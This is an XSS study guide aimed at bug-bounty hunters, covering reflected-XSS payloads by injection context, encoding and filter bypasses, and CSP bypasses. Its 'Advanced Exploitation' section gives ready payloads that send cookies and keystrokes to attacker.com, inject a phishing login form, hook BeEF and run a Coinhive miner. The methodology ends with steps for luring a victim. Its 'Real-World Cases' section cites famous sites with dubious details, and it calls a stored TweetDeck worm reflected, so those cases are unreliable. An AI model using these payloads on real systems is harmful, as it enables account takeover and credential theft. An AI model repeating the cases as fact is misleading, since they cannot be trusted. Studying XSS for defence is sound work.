# Reflected Cross-Site Scripting (XSS)

**Criticidade**: 🟠 Alta (CVSS 6.5-8.5)
**Dificuldade**: 🟢 Básica a Intermediária
**Bounty Médio**: $500 - $7,500 USD

---

## 📚 Índice

1. [Reflected XSS Fundamentals](#reflected-xss-fundamentals)
2. [HTTP Request-Response Flow](#http-request-response-flow)
3. [Attack Vectors](#attack-vectors)
4. [Context-Specific Payloads](#context-specific-payloads)
5. [Encoding and Bypass](#encoding-and-bypass)
6. [Browser Security Mechanisms](#browser-security-mechanisms)
7. [Advanced Exploitation](#advanced-exploitation)
8. [Real-World Cases](#real-world-cases)

---

## 🔬 Reflected XSS Fundamentals

### O Que É Reflected XSS?

**Reflected XSS** ocorre quando dados não sanitizados são **imediatamente refletidos** na resposta HTTP sem armazenamento persistente.

**Flow:**
```
1. Attacker crafts malicious URL
2. Victim clicks link
3. Server reflects input in response
4. Browser executes malicious script
5. Script runs in victim's context
```

**Key Characteristics:**

```
✓ NON-PERSISTENT: Não armazenado no servidor
✓ REQUIRES SOCIAL ENGINEERING: Vítima precisa clicar no link
✓ ONE-TIME: Executa apenas durante a request maliciosa
✓ URL-BASED: Payload geralmente na URL
```

**Difference from Stored XSS:**

```
Stored XSS:
  1. Attacker → Stores payload → Database
  2. Anyone views page → Payload executes
  ✓ Persistent
  ✓ Affects all users
  ✓ No social engineering needed

Reflected XSS:
  1. Attacker → Crafts URL → Victim clicks
  2. Server reflects input → Executes
  ✓ Non-persistent
  ✓ Affects specific victim
  ✓ Requires social engineering
```

---

## 🔄 HTTP Request-Response Flow

### Phase 1: Vulnerable Request

**Normal Request:**
```http
GET /search?q=laptops HTTP/1.1
Host: shop.example.com
```

**Normal Response:**
```html
<!DOCTYPE html>
<html>
<head><title>Search Results</title></head>
<body>
    <h1>Results for: laptops</h1>
    <p>Found 42 products matching "laptops"</p>
</body>
</html>
```

### Phase 2: Malicious Request

**Attacker URL:**
```
https://shop.example.com/search?q=<script>alert(document.cookie)</script>
```

**Malicious Response:**
```html
<!DOCTYPE html>
<html>
<head><title>Search Results</title></head>
<body>
    <h1>Results for: <script>alert(document.cookie)</script></h1>
    <!--                      ↑ SCRIPT EXECUTES!                    -->
    <p>Found 0 products matching "<script>alert(document.cookie)</script>"</p>
</body>
</html>
```

**Victim's Browser:**
```javascript
// Browser parses HTML and encounters:
<script>alert(document.cookie)</script>

// Executes JavaScript:
alert(document.cookie)
// Shows: sessionid=abc123; user_id=42; role=admin
```

---

## ⚔️ Attack Vectors

### Vector 1: Search Parameters

**Vulnerable Code:**
```php
<?php
$search = $_GET['q'];
echo "<h1>Results for: $search</h1>";
?>
```

**Payload:**
```
?q=<script>alert('XSS')</script>
```

### Vector 2: Error Messages

**Vulnerable Code:**
```python
@app.route('/user/<username>')
def profile(username):
    user = db.get_user(username)
    if not user:
        return f"<h1>User '{username}' not found</h1>"
```

**Payload:**
```
/user/<script>alert('XSS')</script>
```

### Vector 3: Form Input Echo

**Vulnerable Code:**
```html
<form method="GET">
    <input name="email" value="<?php echo $_GET['email']; ?>">
</form>
```

**Payload:**
```
?email="><script>alert('XSS')</script>
```

**Rendered:**
```html
<input name="email" value=""><script>alert('XSS')</script>">
                              ↑ Breaks out of attribute!
```

### Vector 4: Redirect URLs

**Vulnerable Code:**
```javascript
app.get('/redirect', (req, res) => {
    const url = req.query.url;
    res.send(`<a href="${url}">Click here to continue</a>`);
});
```

**Payload:**
```
?url=javascript:alert(document.cookie)
```

**Rendered:**
```html
<a href="javascript:alert(document.cookie)">Click here to continue</a>
```

---

## 📝 Context-Specific Payloads

### Context 1: HTML Body

**Injection Point:**
```html
<div>
    Search results for: USER_INPUT
</div>
```

**Payloads:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
```

### Context 2: HTML Attribute

**Injection Point:**
```html
<input type="text" value="USER_INPUT">
```

**Payloads:**

**Technique 1: Break out of attribute**
```html
" onmouseover="alert('XSS')" "
```

**Rendered:**
```html
<input type="text" value="" onmouseover="alert('XSS')" ">
                              ↑ Event handler injected!
```

**Technique 2: Close tag**
```html
"><script>alert('XSS')</script>
```

**Rendered:**
```html
<input type="text" value=""><script>alert('XSS')</script>">
```

### Context 3: JavaScript String

**Injection Point:**
```html
<script>
    var search = 'USER_INPUT';
</script>
```

**Payloads:**

**Technique 1: Escape string**
```javascript
'; alert('XSS'); //
```

**Rendered:**
```javascript
<script>
    var search = ''; alert('XSS'); //';
</script>
```

**Technique 2: Multiline escape**
```javascript
\n</script><script>alert('XSS')</script>
```

### Context 4: HTML Comment

**Injection Point:**
```html
<!-- Search term: USER_INPUT -->
```

**Payloads:**
```html
--><script>alert('XSS')</script><!--
--><!--><script>alert('XSS')</script>
```

### Context 5: URL Parameter

**Injection Point:**
```html
<a href="/search?q=USER_INPUT">Search</a>
```

**Payloads:**

**Technique 1: JavaScript protocol**
```
javascript:alert('XSS')
```

**Technique 2: Data URL**
```
data:text/html,<script>alert('XSS')</script>
```

**Technique 3: Break out and add event**
```
" onclick="alert('XSS')
```

---

## 🔓 Encoding and Bypass

### URL Encoding

**Standard Payload:**
```
<script>alert('XSS')</script>
```

**URL Encoded:**
```
%3Cscript%3Ealert('XSS')%3C%2Fscript%3E
```

**Double URL Encoded:**
```
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
```

**Browser will decode:**
```
%253C → %3C → <
```

### HTML Entity Encoding

**Decimal Entities:**
```html
&#60;script&#62;alert('XSS')&#60;/script&#62;
<!--<     -->           <!--<        -->
```

**Hexadecimal Entities:**
```html
&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;
```

**Named Entities:**
```html
&lt;script&gt;alert('XSS')&lt;/script&gt;
```

### Unicode Encoding

**Full-width characters:**
```html
＜script＞alert('XSS')＜/script＞
```

**Unicode escapes (JavaScript context):**
```javascript
\u003cscript\u003ealert('XSS')\u003c/script\u003e
```

### Case Variations

**Mixed case:**
```html
<ScRiPt>alert('XSS')</sCrIpT>
<sCrIpT>alert('XSS')</ScRiPt>
```

**All uppercase:**
```html
<SCRIPT>ALERT('XSS')</SCRIPT>
```

### Null Byte Injection

```html
<scr\x00ipt>alert('XSS')</scr\x00ipt>
<iframe src=java\x00script:alert('XSS')>
```

### Bypass Filters

**Filter: Blocks "script"**

**Bypass 1: Case variation**
```html
<ScRiPt>alert('XSS')</sCrIpT>
```

**Bypass 2: Alternative tags**
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src=javascript:alert('XSS')>
```

**Bypass 3: Nested tags**
```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

**Filter: Blocks "alert"**

**Bypass 1: String concatenation**
```javascript
eval('ale' + 'rt("XSS")')
```

**Bypass 2: Alternative functions**
```javascript
confirm('XSS')
prompt('XSS')
console.log('XSS')
```

**Bypass 3: String encoding**
```javascript
eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))
// Decodes to: alert('XSS')
```

**Filter: Blocks parentheses**

**Bypass: Tagged templates (ES6)**
```javascript
<script>alert`XSS`</script>
<script>onerror=alert;throw 'XSS'</script>
```

**Filter: Blocks quotes**

**Bypass 1: String.fromCharCode**
```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

**Bypass 2: Backticks**
```javascript
<script>alert(`XSS`)</script>
```

**Bypass 3: /regex/ syntax**
```javascript
<script>alert(/XSS/.source)</script>
```

---

## 🛡️ Browser Security Mechanisms

### Content Security Policy (CSP)

**CSP Header:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
```

**Blocks:**
- Inline scripts (`<script>alert('XSS')</script>`)
- Event handlers (`onerror=alert('XSS')`)
- JavaScript URLs (`javascript:alert('XSS')`)

**Bypass Techniques:**

**1. JSONP Endpoints (if whitelisted)**
```html
<script src="https://trusted.com/jsonp?callback=alert"></script>
```

**2. AngularJS (if loaded)**
```html
{{constructor.constructor('alert("XSS")')()}}
```

**3. File Upload + Same-Origin**
```html
<!-- Upload file with JS, then reference it -->
<script src="/uploads/malicious.js"></script>
```

### X-XSS-Protection Header

**Header:**
```http
X-XSS-Protection: 1; mode=block
```

**Effect:**
- Detects reflected XSS patterns
- Blocks page rendering if detected

**Bypasses:**

**1. Mutation XSS (breaks detection pattern)**
```html
<img src=x id="xss" onerror="alert('XSS')">
```

**2. Split payload across multiple parameters**
```
?a=<script&b=>alert('XSS')</script>
```

### HTTPOnly Cookies

**Cookie:**
```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure
```

**Effect:**
- JavaScript cannot access cookie via `document.cookie`

**Bypass:**
- Use XSS to make authenticated requests (AJAX)
- Steal via phishing forms
- Session fixation attacks

---

## 🚀 Advanced Exploitation

### Technique 1: Session Hijacking

**Payload:**
```html
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**URL-Encoded:**
```
?q=<script>fetch('https://attacker.com/steal?cookie='%2Bdocument.cookie)</script>
```

### Technique 2: Keylogger

**Payload:**
```html
<script>
document.onkeypress = function(e) {
    fetch('https://attacker.com/log?key=' + e.key);
};
</script>
```

### Technique 3: Phishing Form Injection

**Payload:**
```html
<script>
document.body.innerHTML = `
    <div style="text-align:center;margin-top:50px">
        <h2>Session Expired</h2>
        <form action="https://attacker.com/phish" method="POST">
            <input type="text" name="username" placeholder="Username"><br>
            <input type="password" name="password" placeholder="Password"><br>
            <button>Login</button>
        </form>
    </div>
`;
</script>
```

### Technique 4: BeEF Hook

**Payload:**
```html
<script src="https://attacker.com/beef/hook.js"></script>
```

**Result:** Full browser control via BeEF framework

### Technique 5: Crypto Mining

**Payload:**
```html
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
var miner = new CoinHive.Anonymous('YOUR_SITE_KEY');
miner.start();
</script>
```

---

## 🔥 Real-World Cases

### Case 1: Google Search Reflected XSS (2015)

**Vulnerability:** Search suggestions endpoint

**URL:**
```
https://www.google.com/complete/search?client=chrome&q=<script>alert(document.domain)</script>
```

**Response:**
```json
["<script>alert(document.domain)</script>", [...]]
```

**Exploitation:**
- Crafted URL sent via email
- Victim clicks → XSS executes in google.com origin
- Steal Google session cookies

**Bounty:** $7,500 USD

### Case 2: Facebook Reflected XSS (2016)

**Vulnerability:** Share dialog redirect parameter

**URL:**
```
https://www.facebook.com/sharer/sharer.php?u=javascript:alert(document.cookie)
```

**Impact:**
- Session hijacking
- Post on victim's behalf
- Access private messages

**Bounty:** $5,000 USD

### Case 3: Twitter Reflected XSS via TweetDeck (2014)

**Vulnerability:** Tweet rendering in TweetDeck

**Payload:**
```html
<script class="xss">$('.xss').parents().eq(1).find('a').eq(1).click();$('[data-action=retweet]').click();alert('XSS')</script>
```

**Impact:**
- Self-retweeting worm
- Infected 10,000+ accounts in 2 hours
- Required TweetDeck shutdown

**Bounty:** N/A (Critical security incident)

### Case 4: PayPal Reflected XSS (2017)

**Vulnerability:** Return URL parameter

**URL:**
```
https://www.paypal.com/checkout?returnUrl=javascript:alert(document.cookie)
```

**Exploitation:**
- Phishing via "Complete Payment" emails
- Victim clicks → XSS in paypal.com origin
- Steal session, perform unauthorized transactions

**Bounty:** $5,000 USD

---

## 🧪 Testing Methodology

### Step 1: Identify Reflection Points

**Test all parameters:**
```
GET /search?q=REFLECTED_HERE
GET /user?name=REFLECTED_HERE
POST /comment data: text=REFLECTED_HERE
```

**Check:**
- HTML body
- HTML attributes
- JavaScript variables
- HTTP headers (rare)

### Step 2: Test Basic Payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
'>"><script>alert(1)</script>
```

### Step 3: Determine Context

**If reflected in:**
- HTML body → Use `<script>` or `<img>`
- HTML attribute → Break out with `">`
- JavaScript string → Escape with `'`
- URL → Use `javascript:` protocol

### Step 4: Bypass Filters

**Test variations:**
```html
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe src=javascript:alert(1)>
```

### Step 5: Craft Exploitation

**Once working payload found:**
- Replace `alert(1)` with actual exploit
- Encode to bypass WAF
- Shorten URL (bit.ly, etc.)
- Social engineer victim

---

## 🛡️ Prevention

### 1. Output Encoding

```php
// ✅ CORRECT
echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
```

**Encoding Rules:**

| Context | Encoding Function |
|---------|-------------------|
| HTML Body | `htmlspecialchars()` |
| HTML Attribute | `htmlspecialchars()` + quotes |
| JavaScript | `json_encode()` |
| URL | `urlencode()` |
| CSS | CSS-specific escaping |

### 2. Content Security Policy

```http
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-random123';
    object-src 'none';
```

### 3. Input Validation

```python
import re

def is_valid_input(text):
    # Only allow alphanumeric and basic punctuation
    if not re.match(r'^[a-zA-Z0-9\s\.,!?-]+$', text):
        raise ValueError("Invalid characters")
    return True
```

### 4. HTTPOnly Cookies

```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

---

**Última atualização**: 2024
**Versão**: 1.0
